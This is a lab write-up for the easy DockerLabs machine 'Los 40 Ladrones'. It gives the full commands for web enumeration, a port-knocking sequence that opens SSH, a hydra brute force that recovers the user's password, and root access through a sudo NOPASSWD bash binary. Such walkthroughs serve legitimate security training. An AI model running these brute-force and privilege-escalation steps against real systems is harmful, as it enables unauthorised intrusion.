# Los 40 Ladrones - DockerLabs - Easy

## Summary

**Los 40 Ladrones** is an easy Linux machine from DockerLabs themed around *Ali Baba and the 40 Thieves*. The attack path involves web enumeration to discover a text file containing port knocking instructions, which unlocks SSH. A brute force attack on the discovered username yields credentials, and privilege escalation is trivial via a NOPASSWD `bash` binary in `/opt/`.

---

## Tools

- `nmap` — port and service enumeration
- `gobuster` — web directory/file brute force
- `knock` / `nmap` — port knocking sequence
- `hydra` — SSH brute force

---

## 1. Enumeration

### Port Scan

```bash
nmap -sV -sC -p- 172.17.0.2
```

Only one open port:
- **80** — HTTP (Apache 2.4.58 on Ubuntu)

### Web Enumeration

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 20
```

Key finding:
- `/qdefense.txt` — plaintext file with port knocking instructions

### qdefense.txt Contents

```
Recuerda llama antes de entrar, no seas como toctoc el maleducado
7000 8000 9000
busca y llama +54 2933574639
```

This reveals three things:
1. **Port knocking sequence:** `7000 → 8000 → 9000`
2. **Potential username:** `toctoc` (mentioned by name)
3. **Potential credential hint:** phone number `2933574639`

### Port Knocking

```bash
knock 172.17.0.2 7000 8000 9000
```

Or manually with nmap:
```bash
nmap -Pn --host-timeout 201 --max-retries 0 -p 7000 172.17.0.2
nmap -Pn --host-timeout 201 --max-retries 0 -p 8000 172.17.0.2
nmap -Pn --host-timeout 201 --max-retries 0 -p 9000 172.17.0.2
```

After knocking, re-scan reveals:
- **22** — SSH now open

---

## 2. Exploitation

### SSH Brute Force

```bash
hydra -l toctoc -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4
```

**Result:** `toctoc : kittycat`

### SSH Access

```bash
ssh toctoc@172.17.0.2
# password: kittycat
```

Shell obtained as `toctoc`.

---

## 3. Escalate Privileges

### sudo -l

```bash
sudo -l
```

Output:
```
User toctoc may run the following commands on fa5f61a53fc1:
    (ALL : NOPASSWD) /opt/bash
    (ALL : NOPASSWD) /ahora/noesta/function
```

`/opt/bash` is executable as root with no password required.

### Privilege Escalation

```bash
sudo /opt/bash
whoami
# root
```

Instant root — no TTY upgrade needed since SSH provides a full terminal.

---

## 4. Lessons Learned

1. **Always enumerate web content thoroughly** — a single `.txt` file contained the entire attack path.
2. **Port knocking hides services from passive scans** — always check for knockd configurations or hints in web content when only port 80 is visible.
3. **Usernames can be embedded in lore/flavor text** — "toctoc el maleducado" was both a story reference and the actual system username.
4. **`/opt/` is a common location for custom SUID/sudo binaries** — always check non-standard paths in `sudo -l` output.
5. **NOPASSWD on a shell binary = instant root** — any binary that spawns a shell (`bash`, `sh`, `python`, etc.) with sudo NOPASSWD is an immediate privesc.

---

## Flags

| Flag | Value |
|------|-------|
| user.txt | *(check `/home/toctoc/`)* |
| root.txt | *(check `/root/`)* |